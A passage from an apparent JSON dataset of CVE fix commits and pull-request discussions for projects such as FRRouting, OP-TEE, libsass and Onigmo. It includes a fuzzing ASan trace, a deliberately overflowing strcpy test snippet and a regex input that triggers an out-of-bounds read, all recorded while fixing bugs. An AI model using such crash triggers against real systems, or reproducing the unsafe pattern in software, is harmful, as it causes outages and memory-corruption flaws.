is compatible with all the stuff actually used in the wild). In the meantime I'm on the way to make some fuzzing tools compatible with `avahi`: https://github.com/ossf/fuzz-introspector/pull/620. DBus is fun but adjacent networks are more interesting. @pemensik I have found another local DOS like that (and also figured out where https://github.com/lathiat/avahi/issues/391 most likely came from). I wonder if I should report them publicly or do you think it would make sense to set up something like https://docs.github.com/en/code-security/security-advisories/guidance-on-reporting-and-writing/privately-reporting-a-security-vulnerability? FWIW looking at https://github.com/lathiat/avahi/issues/338 and https://github.com/lathiat/avahi/pull/330 it seems that in general historically local DOSes are reported publicly (and that's why I reported https://github.com/lathiat/avahi/issues/375 publicly as well). Anyway just let me know how I should report those issues. I think https://docs.github.com/en/code-security/security-advisories/guidance-on-reporting-and-writing/privately-reporting-a-security-vulnerability should do. More generally I think it would make sense to also add https://docs.github.com/en/code-security/getting-started/adding-a-security-policy-to-your-repository to the repository as well. @pemensik I invited you to my private fork of avahi. I think it should be possible to discuss those issues there in the meantime.",
            "pr_title_words": 9,
            "comments_words": 615,
            "total_other_info_words": 624
        },
        {
            "cve-id": "CVE-2023-41359",
            "commit_url": "https://github.com/FRRouting/frr/commit/f96201e104892e18493f24cf67bb713678e8237b",
            "commit_msg": "bgpd: Make sure we have enough data to read two bytes when validating AIGP\n\nFound when fuzzing:\n\n```\n==3470861==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xffff77801ef7 at pc 0xaaaaba7b3dbc bp 0xffffcff0e760 sp 0xffffcff0df50\nREAD of size 2 at 0xffff77801ef7 thread T0\n    0 0xaaaaba7b3db8 in __asan_memcpy (/home/ubuntu/frr_8_5_2/frr_8_5_2_fuzz_clang/bgpd/bgpd+0x363db8) (BuildId: cc710a2356e31c7f4e4a17595b54de82145a6e21)\n    1 0xaaaaba81a8ac in ptr_get_be16 /home/ubuntu/frr_8_5_2/frr_8_5_2_fuzz_clang/./lib/stream.h:399:2\n    2 0xaaaaba819f2c in bgp_attr_aigp_valid /home/ubuntu/frr_8_5_2/frr_8_5_2_fuzz_clang/bgpd/bgp_attr.c:504:3\n    3 0xaaaaba808c20 in bgp_attr_aigp /home/ubuntu/frr_8_5_2/frr_8_5_2_fuzz_clang/bgpd/bgp_attr.c:3275:7\n    4 0xaaaaba7ff4e0 in bgp_attr_parse /home/ubuntu/frr_8_5_2/frr_8_5_2_fuzz_clang/bgpd/bgp_attr.c:3678:10\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>",
            "commit_msg_words": 75,
            "other_info": "bgpd: Make sure we have enough data to read two bytes when validating AIGP @Mergifyio backport stable/9.0 stable/8.5 > backport stable/9.0 stable/8.5\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#14267 bgpd: Make sure we have enough data to read two bytes when validating AIGP (backport #14232)](https://github.com/FRRouting/frr/pull/14267) has been created for branch `stable/9.0`\n* [#14268 bgpd: Make sure we have enough data to read two bytes when validating AIGP (backport #14232)](https://github.com/FRRouting/frr/pull/14268) has been created for branch `stable/8.5`\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport stable/9.0 stable/8.5\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n--> <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nTest incomplete. See below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13630/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Successful\n### Basic Tests: Incomplete\n<details>\n<summary>Topotests Ubuntu 18.04 arm8 part 6: Failed (click for details)</summary>\nTopotests Ubuntu 18.04 arm8 part 6: No useful log found\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 arm8 part 8: Failed (click for details)</summary>\nTopotests Ubuntu 18.04 arm8 part 8: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13630/artifact/TOPO8U18AMD64/TopotestDetails/\nTopotests Ubuntu 18.04 arm8 part 8: No useful log found\n</details>\n<details><summary>Addresssanitizer topotests part 4: Incomplete</summary>\n(check logs for details)</details>\n<details>\n<summary>Topotests Ubuntu 18.04 arm8 part 9: Failed (click for details)</summary>\nTopotests Ubuntu 18.04 arm8 part 9: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13630/artifact/TOPO9U18ARM8/TopotestDetails/\nTopotests Ubuntu 18.04 arm8 part 9: No useful log found\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 i386 part 9: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO9U18I386-13630/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 i386 part 9__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-13630/artifact/TOPO9U18I386/TopotestLogs/log_topotests.txt\nTopotests Ubuntu 18.04 i386 part 9: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13630/artifact/TOPO9U18I386/TopotestDetails/\n</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- Topotests Ubuntu 18.04 amd64 part 0\n- Topotests Ubuntu 18.04 arm8 part 1\n- Topotests Ubuntu 18.04 amd64 part 7\n- Topotests debian 10 amd64 part 6\n- Addresssanitizer topotests part 3\n- Topotests Ubuntu 18.04 i386 part 5\n- Addresssanitizer topotests part 2\n- Topotests debian 10 amd64 part 5\n- Topotests Ubuntu 18.04 arm8 part 2\n- Addresssanitizer topotests part 9\n- Topotests Ubuntu 18.04 amd64 part 4\n- CentOS 7 rpm pkg check\n- Topotests debian 10 amd64 part 7\n- Topotests Ubuntu 18.04 amd64 part 3\n- Addresssanitizer topotests part 8\n- Topotests Ubuntu 18.04 i386 part 7\n- Topotests Ubuntu 18.04 i386 part 2\n- Ubuntu 18.04 deb pkg check\n- Topotests Ubuntu 18.04 i386 part 0\n- Addresssanitizer topotests part 6\n- Topotests Ubuntu 18.04 amd64 part 1\n- Topotests Ubuntu 18.04 amd64 part 2\n- Topotests Ubuntu 18.04 i386 part 8\n- Topotests Ubuntu 18.04 i386 part 3\n- Addresssanitizer topotests part 0\n- Debian 10 deb pkg check\n- Topotests debian 10 amd64 part 3\n- Topotests debian 10 amd64 part 8\n- Topotests Ubuntu 18.04 amd64 part 6\n- Topotests Ubuntu 18.04 arm8 part 4\n- Debian 9 deb pkg check\n- Topotests Ubuntu 18.04 arm8 part 3\n- Addresssanitizer topotests part 1\n- Topotests debian 10 amd64 part 9\n- Topotests Ubuntu 18.04 i386 part 4\n- Topotests debian 10 amd64 part 4\n- Topotests Ubuntu 18.04 amd64 part 9\n- Topotests Ubuntu 18.04 arm8 part 0\n- Topotests Ubuntu 18.04 arm8 part 7\n- Topotests debian 10 amd64 part 2\n- Topotests Ubuntu 18.04 amd64 part 8\n- Addresssanitizer topotests part 7\n- Static analyzer (clang)\n- Topotests debian 10 amd64 part 0\n- Topotests Ubuntu 18.04 amd64 part 5\n- Ubuntu 20.04 deb pkg check\n- Topotests Ubuntu 18.04 arm8 part 5\n- Addresssanitizer topotests part 5\n- Topotests debian 10 amd64 part 1\n- Topotests Ubuntu 18.04 i386 part 6\n- Topotests Ubuntu 18.04 i386 part 1\n</details>\n\n</details> <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nSee below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13630/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Successful\n### Basic Tests: Failed\n<details>\n<summary>Topotests Ubuntu 18.04 arm8 part 6: Failed (click for details)</summary>\nTopotests Ubuntu 18.04 arm8 part 6: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13630/artifact/TOPO6U18ARM8/TopotestDetails/\nTopotests Ubuntu 18.04 arm8 part 6: No useful log found\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 arm8 part 8: Failed (click for details)</summary>\nTopotests Ubuntu 18.04 arm8 part 8: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13630/artifact/TOPO8U18AMD64/TopotestDetails/\nTopotests Ubuntu 18.04 arm8 part 8: No useful log found\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 arm8 part 9: Failed (click for details)</summary>\nTopotests Ubuntu 18.04 arm8 part 9: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13630/artifact/TOPO9U18ARM8/TopotestDetails/\nTopotests Ubuntu 18.04 arm8 part 9: No useful log found\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 i386 part 9: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO9U18I386-13630/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 i386 part 9__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-13630/artifact/TOPO9U18I386/TopotestLogs/log_topotests.txt\nTopotests Ubuntu 18.04 i386 part 9: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13630/artifact/TOPO9U18I386/TopotestDetails/\n</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- Topotests Ubuntu 18.04 amd64 part 0\n- Topotests Ubuntu 18.04 arm8 part 1\n- Topotests Ubuntu 18.04 amd64 part 7\n- Topotests debian 10 amd64 part 6\n- Addresssanitizer topotests part 3\n- Topotests Ubuntu 18.04 i386 part 5\n- Addresssanitizer topotests part 2\n- Topotests debian 10 amd64 part 5\n- Topotests Ubuntu 18.04 arm8 part 2\n- Addresssanitizer topotests part 9\n- Topotests Ubuntu 18.04 amd64 part 4\n- CentOS 7 rpm pkg check\n- Topotests debian 10 amd64 part 7\n- Topotests Ubuntu 18.04 amd64 part 3\n- Addresssanitizer topotests part 8\n- Topotests Ubuntu 18.04 i386 part 7\n- Topotests Ubuntu 18.04 i386 part 2\n- Ubuntu 18.04 deb pkg check\n- Topotests Ubuntu 18.04 i386 part 0\n- Addresssanitizer topotests part 6\n- Topotests Ubuntu 18.04 amd64 part 1\n- Topotests Ubuntu 18.04 amd64 part 2\n- Topotests Ubuntu 18.04 i386 part 8\n- Topotests Ubuntu 18.04 i386 part 3\n- Addresssanitizer topotests part 0\n- Debian 10 deb pkg check\n- Topotests debian 10 amd64 part 3\n- Topotests debian 10 amd64 part 8\n- Topotests Ubuntu 18.04 amd64 part 6\n- Topotests Ubuntu 18.04 arm8 part 4\n- Addresssanitizer topotests part 4\n- Debian 9 deb pkg check\n- Topotests Ubuntu 18.04 arm8 part 3\n- Addresssanitizer topotests part 1\n- Topotests debian 10 amd64 part 9\n- Topotests Ubuntu 18.04 i386 part 4\n- Topotests debian 10 amd64 part 4\n- Topotests Ubuntu 18.04 amd64 part 9\n- Topotests Ubuntu 18.04 arm8 part 0\n- Topotests Ubuntu 18.04 arm8 part 7\n- Topotests debian 10 amd64 part 2\n- Topotests Ubuntu 18.04 amd64 part 8\n- Addresssanitizer topotests part 7\n- Static analyzer (clang)\n- Topotests debian 10 amd64 part 0\n- Topotests Ubuntu 18.04 amd64 part 5\n- Ubuntu 20.04 deb pkg check\n- Topotests Ubuntu 18.04 arm8 part 5\n- Addresssanitizer topotests part 5\n- Topotests debian 10 amd64 part 1\n- Topotests Ubuntu 18.04 i386 part 6\n- Topotests Ubuntu 18.04 i386 part 1\n</details>\n\n</details> <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nTest incomplete. See below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13644/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Successful\n### Basic Tests: Incomplete\n<details><summary>Addresssanitizer topotests part 4: Incomplete</summary>\n(check logs for details)</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- Topotests Ubuntu 18.04 i386 part 6\n- Addresssanitizer topotests part 2\n- Topotests Ubuntu 18.04 amd64 part 5\n- Topotests Ubuntu 18.04 amd64 part 4\n- Topotests Ubuntu 18.04 i386 part 1\n- Addresssanitizer topotests part 9\n- Topotests Ubuntu 18.04 arm8 part 7\n- Topotests debian 10 amd64 part 6\n- Topotests Ubuntu 18.04 arm8 part 6\n- Topotests Ubuntu 18.04 arm8 part 1\n- Topotests Ubuntu 18.04 arm8 part 2\n- Addresssanitizer topotests part 3\n- Topotests Ubuntu 18.04 amd64 part 7\n- Topotests Ubuntu 18.04 i386 part 2\n- Topotests debian 10 amd64 part 5\n- Topotests debian 10 amd64 part 0\n- Topotests Ubuntu 18.04 arm8 part 8\n- Addresssanitizer topotests part 7\n- Topotests Ubuntu 18.04 i386 part 0\n- Topotests debian 10 amd64 part 9\n- Topotests Ubuntu 18.04 i386 part 7\n- Addresssanitizer topotests part 6\n- CentOS 7 rpm pkg check\n- Topotests debian 10 amd64 part 7\n- Topotests Ubuntu 18.04 amd64 part 2\n- Topotests Ubuntu 18.04 amd64 part 3\n- Topotests Ubuntu 18.04 amd64 part 0\n- Topotests debian 10 amd64 part 8\n- Topotests Ubuntu 18.04 arm8 part 4\n- Topotests Ubuntu 18.04 i386 part 5\n- Ubuntu 20.04 deb pkg check\n- Ubuntu 18.04 deb pkg check\n- Topotests Ubuntu 18.04 arm8 part 9\n- Debian 10 deb pkg check\n- Debian 9 deb pkg check\n- Addresssanitizer topotests part 1\n- Topotests Ubuntu 18.04 i386 part 4\n- Topotests Ubuntu 18.04 amd64 part 1\n- Topotests Ubuntu 18.04 i386 part 3\n- Topotests Ubuntu 18.04 i386 part 8\n- Addresssanitizer topotests part 8\n- Topotests Ubuntu 18.04 amd64 part 6\n- Topotests Ubuntu 18.04 amd64 part 9\n- Topotests Ubuntu 18.04 arm8 part 5\n- Addresssanitizer topotests part 5\n- Topotests Ubuntu 18.04 arm8 part 3\n- Topotests debian 10 amd64 part 1\n- Topotests debian 10 amd64 part 4\n- Topotests debian 10 amd64 part 2\n- Topotests Ubuntu 18.04 i386 part 9\n- Topotests Ubuntu 18.04 arm8 part 0\n- Topotests Ubuntu 18.04 amd64 part 8\n- Topotests debian 10 amd64 part 3\n- Addresssanitizer topotests part 0\n- Static analyzer (clang)\n</details>\n\n</details> <details><summary>Continuous Integration Result: SUCCESSFUL</summary>\n\n#  Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13644/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n</details> <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nTest incomplete. See below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13677/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Successful\n### Basic Tests: Incomplete\n<details><summary>Addresssanitizer topotests part 4: Incomplete</summary>\n(check logs for details)</details>\n<details>\n<summary>Topotests Ubuntu 18.04 i386 part 1: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO1U18I386-13677/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 i386 part 1__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-13677/artifact/TOPO1U18I386/TopotestLogs/log_topotests.txt\nTopotests Ubuntu 18.04 i386 part 1: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13677/artifact/TOPO1U18I386/TopotestDetails/\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 i386 part 9: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO9U18I386-13677/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 i386 part 9__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-13677/artifact/TOPO9U18I386/TopotestLogs/log_topotests.txt\nTopotests Ubuntu 18.04 i386 part 9: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13677/artifact/TOPO9U18I386/TopotestDetails/\n</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- Topotests Ubuntu 18.04 arm8 part 3\n- Topotests debian 10 amd64 part 9\n- Addresssanitizer topotests part 5\n- Topotests debian 10 amd64 part 4\n- Topotests Ubuntu 18.04 amd64 part 3\n- Topotests Ubuntu 18.04 amd64 part 2\n- Topotests debian 10 amd64 part 8\n- Addresssanitizer topotests part 0\n- Topotests debian 10 amd64 part 3\n- Topotests Ubuntu 18.04 arm8 part 4\n- Addresssanitizer topotests part 2\n- Topotests Ubuntu 18.04 arm8 part 9\n- Ubuntu 20.04 deb pkg check\n- Topotests Ubuntu 18.04 amd64 part 5\n- Topotests Ubuntu 18.04 i386 part 6\n- Debian 10 deb pkg check\n- Topotests Ubuntu 18.04 amd64 part 4\n- Addresssanitizer topotests part 9\n- Topotests Ubuntu 18.04 amd64 part 9\n- Topotests Ubuntu 18.04 arm8 part 7\n- Topotests Ubuntu 18.04 i386 part 8\n- Topotests Ubuntu 18.04 i386 part 3\n- Addresssanitizer topotests part 3\n- Topotests Ubuntu 18.04 arm8 part 2\n- Topotests Ubuntu 18.04 amd64 part 7\n- Topotests debian 10 amd64 part 0\n- Addresssanitizer topotests part 7\n- Topotests Ubuntu 18.04 i386 part 0\n- Addresssanitizer topotests part 6\n- CentOS 7 rpm pkg check\n- Topotests debian 10 amd64 part 1\n- Topotests Ubuntu 18.04 arm8 part 5\n- Topotests debian 10 amd64 part 2\n- Topotests debian 10 amd64 part 7\n- Topotests Ubuntu 18.04 arm8 part 0\n- Topotests Ubuntu 18.04 amd64 part 8\n- Topotests Ubuntu 18.04 amd64 part 0\n- Static analyzer (clang)\n- Topotests Ubuntu 18.04 i386 part 5\n- Ubuntu 18.04 deb pkg check\n- Topotests debian 10 amd64 part 5\n- Debian 9 deb pkg check\n- Addresssanitizer topotests part 1\n- Topotests Ubuntu 18.04 i386 part 4\n- Topotests Ubuntu 18.04 amd64 part 1\n- Topotests debian 10 amd64 part 6\n- Topotests Ubuntu 18.04 arm8 part 1\n- Addresssanitizer topotests part 8\n- Topotests Ubuntu 18.04 arm8 part 6\n- Topotests Ubuntu 18.04 i386 part 7\n- Topotests Ubuntu 18.04 amd64 part 6\n- Topotests Ubuntu 18.04 i386 part 2\n- Topotests Ubuntu 18.04 arm8 part 8\n</details>\n\n</details> # Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-13677/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n @Mergifyio backport stable/8.4 > backport stable/8.4\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#15927 bgpd: Make sure we have enough data to read two bytes when validating AIGP (backport #14232)](https://github.com/FRRouting/frr/pull/15927) has been created for branch `stable/8.4` but encountered conflicts\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport stable/8.4\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n-->",
            "pr_title_words": 14,
            "comments_words": 2300,
            "total_other_info_words": 2314
        }
    ],
    "2019": [
        {
            "cve-id": "CVE-2019-1010293",
            "commit_url": "https://github.com/OP-TEE/optee_os/commit/95f36d661f2b75887772ea28baaad904bde96970",
            "commit_msg": "core: tee_mmu_check_access_rights() check all pages\n\nPrior to this patch tee_mmu_check_access_rights() checks an address in\neach page of a supplied range. If both the start and length of that\nrange is unaligned the last page in the range is sometimes not checked.\nWith this patch the first address of each page in the range is checked\nto simplify the logic of checking each page and the range and also to\ncover the last page under all circumstances.\n\nFixes: OP-TEE-2018-0005: \"tee_mmu_check_access_rights does not check\nfinal page of TA buffer\"\n\nSigned-off-by: Jens Wiklander <jens.wiklander@linaro.org>\nTested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8)\nReviewed-by: Joakim Bech <joakim.bech@linaro.org>\nReported-by: Riscure <inforequest@riscure.com>\nReported-by: Alyssa Milburn <a.a.milburn@vu.nl>\nAcked-by: Etienne Carriere <etienne.carriere@linaro.org>",
            "commit_msg_words": 113,
            "other_info": "Fixes for security potential issues reported by Riscure I've seen the Shippable error, I'll have a look at it. > I've seen the Shippable error, I'll have a look at it.\r\n\r\nI've changed the macro to only consider SMALL_PAGE_SIZE, since that is what we check against. Will push a fix soon. Pushed fixes for all (fixable) comments so far. I've saved the ones that has to be done at rebase/force push time. LGTM, you may add my:\r\n\r\n`Acked-by: Jerome Forissier <jerome.forissier@linaro.org>`\r\n\r\n...to all the commits that deal with CFG_ flags. `Acked-by: Etienne Carriere <etienne.carriere@linaro.org>` for the whole with some minor comments. > `Acked-by: Etienne Carriere <etienne.carriere@linaro.org>` for the whole with some minor comments.\r\n\r\n@etienne-lms , I'm confused. I cannot see any comments from you. Is GitHub playing me a trick here? Pushed a few more fixes.\r\n\r\nWaiting for:\r\n- Etienne's follow up answers on my replies to his findings.\r\n\r\nTo-do at rebase/force/squash:\r\n- Add Acked-by tags.\r\n- Fix wrong author vs Signed-Off-By.\r\n - Fixed SoB / Author inconsistency.\r\n- Fixed all outstanding review comments.\r\n- Fixed spelling error found by checkpatch / Shippable.\r\n- Added A-B and T-B tags.\r\n\r\nSo, if IBART and friends are happy .... then ...\r\nSquashed, rebased and tag(s) applied (should be) ready for merge! Thanks! Sorry, I still have comments on the last 6 commits.\r\n\r\n- \"plat-all: Enable CFG_CORE_STACK_PROTECTOR_STRONG=y by default\" removes `CFG_WITH_STACK_CANARIES ?= y` from `rpi3`. It also enables`CFG_TA_STACK_PROTECTOR_STRONG ?= y` which is introduced in a later commit. Overall I think this commit had better be folded into the parent commit \"core: introduce CFG_CORE_STACK_PROTECTOR_STRONG flag\" (which will also avoid a Travis warning about missing commit description).\r\n- \"ta-dev-kit: enable _FORTIFY_SOURCE=2 on optimized builds\": you say \"shall only be enabled...\", so why isn't it part of commit \"ta-dev-kit: Introduce CFG_TA_FORTIFY_SOURCE\"?\r\n\r\nAlso I think the Travis warnings (missing commit descriptions) should be fixed. When introducing a new flag, we should explain what it does, why we add it, and what is its default value. Things I expect to understand when reading the description are: what is a stack protector? What happens when the \"protection\" detects that something is wrong? Does the TA panic? Does the TEE core panic? Same for the \"fortify\" option.\r\n\r\nIn the end I'd like to have 4 commits:\r\n```\r\n    ta: introduce CFG_TA_STACK_PROTECTOR_STRONG\r\n    ta: introduce CFG_TA_FORTIFY_SOURCE\r\n    core: introduce CFG_CORE_STACK_PROTECTOR_STRONG\r\n    core: introduce CFG_CORE_FORTIFY_SOURCE\r\n```\r\n @jforissier , makes sense. I'll do another clean-up / clarification round, stay tuned. Easier said that done trying to trigger the protectors, since I get data abort when trying to put together examples that should trigger the stack-protector for example. I'd expect some output like \"`*** stack smashing detected ***` at least before the data-abort. @jbech-linaro hard to find documentation, but it looks like the compiler will just call `__stack_chk_fail()`, which we happen to define here: https://github.com/OP-TEE/optee_os/blob/3.3.0/lib/libutils/isoc/stack_check.c\r\nAt least, that's what I can see in the disassembly (`tee.dmp` or `objdump -ldx ta.elf`).\r\n\r\nSo, if I understand correctly, the TA or the TEE core thread would just hang when stack smashing is detected (instead of proceeding with corrupt data). I think I can trigger it successfully now, since without using the flags I get data-aborts, with the flags enabled I get stuck. I've tried to figure out where I am by checking GDB, but so far I haven't been able to make sense out of the address. I'll try to see whether it ends up in `stack_check.c` or not. @jbech-linaro sounds good. Perhaps `__stack_chk_fail()` should `EMSG()` and call `panic()` (`ifdef __KERNEL__`) or `abort()`/`utee_panic()` (user mode TA). Or is there any reason we could not do that in this context? I've tried setting a breakpoint at `__stack_chk_fail`, but it doesn't seem to hang there. But I can see my data (`foo(AAAA...)`) in the `r2` when breaking, so I suspect it is stuck somewhere in strcpy, and/or \"panic\" while(1) as a consequence of this.\r\n```bash\r\nfoo(\"AAAAAAA.....\");\r\n\r\nvoid foo(char *bar) {\r\nchar buffer[16];\r\nstrcpy(buffer, bar)\r\n}\r\n```\r\n\r\n```\r\nr2 = 0x00414141\r\n...\r\n```\r\nI think I will skip the CFG_-patches and submit them as a separate PR if/when I have some time to spare. They weren't really part of the Riscure report, I just added it, since I thought it'd be useful to catch things. > I think I will skip the CFG_-patches [...]\r\n\r\nSure. They are definitely useful IMO, but certainly not required for 3.4.0. Thanks! Two things ....\r\n1. I've removed the CFG patches from this PR and pushed that.\r\n2. I've rebuilt QEMU with SMP=1 and now!!! Lo and behold! I'm stuck in .... drum roll ... `__stack_chk_fail() { while (1) }`.\r\n\r\nSo it seems to work as expected.\r\n\r\nAnyhow, as before, if IBART and friends are happy:\r\nSquashed, rebased and tag(s) applied (should be) ready for merge! Thanks!",
            "pr_title_words": 8,
            "comments_words": 780,
            "total_other_info_words": 788
        },
        {
            "cve-id": "CVE-2019-9004",
            "commit_url": "https://github.com/eclipse-wakaama/wakaama/commit/533f285ff6fd9c2284fd290bdfbd355e302ae9a4",
            "commit_msg": "Fix memory leak with bad options.\n\nOption processing can allocate memory. Encountering a bad option was\nreturning and error without freeing that memory. This adds the necessary\ncalls to free the memory to fix #425.\n\nSigned-off-by: Scott Bertin <sbertin@telular.com>",
            "commit_msg_words": 39,
            "other_info": "Fix memory leak with bad options.",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2019-18798",
            "commit_url": "https://github.com/sass/libsass/commit/0b721e0f37fc69ab197ec956a923e036e3b05ca6",
            "commit_msg": "Fix out of boundary vector access\n\nFixes https://github.com/sass/libsass/issues/2999",
            "commit_msg_words": 8,
            "other_info": "Fix a few segfaults",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2019-5312",
            "commit_url": "https://github.com/Wechat-Group/WxJava/commit/8ec61d1328f50e23cd14285a950ca57a088b32b2",
            "commit_msg": "#903 disable DOCTYPE to fix XXE Vulnerability",
            "commit_msg_words": 7,
            "other_info": "\u5408\u5e76\u5f00\u53d1\u5206\u652f\uff0c\u51c6\u5907\u53d1\u5e03\u6b63\u5f0f\u7248",
            "pr_title_words": 1,
            "comments_words": 0,
            "total_other_info_words": 1
        },
        {
            "cve-id": "CVE-2019-16930",
            "commit_url": "https://github.com/zcash/zcash/commit/c1fbf8ab5d73cff5e1f45236995857c75ba4128d",
            "commit_msg": "Ignore exceptions when deserializing note plaintexts",
            "commit_msg_words": 6,
            "other_info": "Release v2.0.7-3 @zkbot r+ :pushpin: Commit e3983af has been approved by `str4d`\n\n<!-- @zkbot r=str4d e3983afc03d256813662aa2cb07fbe1a05b9ab05 --> :hourglass: Testing commit e3983afc03d256813662aa2cb07fbe1a05b9ab05 with merge 62dc5f0821ea0795c9cc4c09baad1e1be3c8e9b0... :sunny: Test successful - [pr-merge](https://ci.z.cash/#builders/3/builds/736)\nApproved by: str4d\nPushing 62dc5f0821ea0795c9cc4c09baad1e1be3c8e9b0 to master...",
            "pr_title_words": 2,
            "comments_words": 34,
            "total_other_info_words": 36
        },
        {
            "cve-id": "CVE-2019-20798",
            "commit_url": "https://github.com/cherokee/webserver/commit/39c6b73ff1b4749812eea940fa63e54e2ed860da",
            "commit_msg": "Use relative paths in the handler_server_info page\n\nIssue #1227 describes a XSS vulnerability on the about page of cherokee-admin.\nWhile the report by LogicalTrust only describes a JavaScript variant, a CSS method could also be probed via logo.gif.\n\nThe root cause is the request being verbatim copied in to the HTML template. The request could be escaped, but leads to the question: Why are we presenting a full path, instead of a\nrelative path to the page? This change removes the full path, and makes it relative. No URL is being printed in the template, and the XSS is avoided and therefore it should also be\nfaster.",
            "commit_msg_words": 107,
            "other_info": "Use relative paths in the handler_server_info page",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2019-25058",
            "commit_url": "https://github.com/USBGuard/usbguard/commit/df5f01c6ed0c20d269f7239901d21883cc871bbb",
            "commit_msg": "dbus: Add missing checks for authorization using Polkit",
            "commit_msg_words": 8,
            "other_info": "[CVE-2019-25058] Fix unauthorized access via D-Bus (fixes #273, fixes #403) I don't have any objections.",
            "pr_title_words": 10,
            "comments_words": 5,
            "total_other_info_words": 15
        },
        {
            "cve-id": "CVE-2019-16162",
            "commit_url": "https://github.com/k-takata/Onigmo/commit/d4cf99d30bd5f6a8a4ababd0b9d7b06f3a479a24",
            "commit_msg": "Fix out-of-bounds read in parse_char_class() (Close #139)\n\n/[\\x{111111}]/ causes out-of-bounds read when encoding is a single byte\nencoding. \\x{111111} is an invalid codepoint for a single byte encoding.\nCheck if it is a valid codepoint.",
            "commit_msg_words": 35,
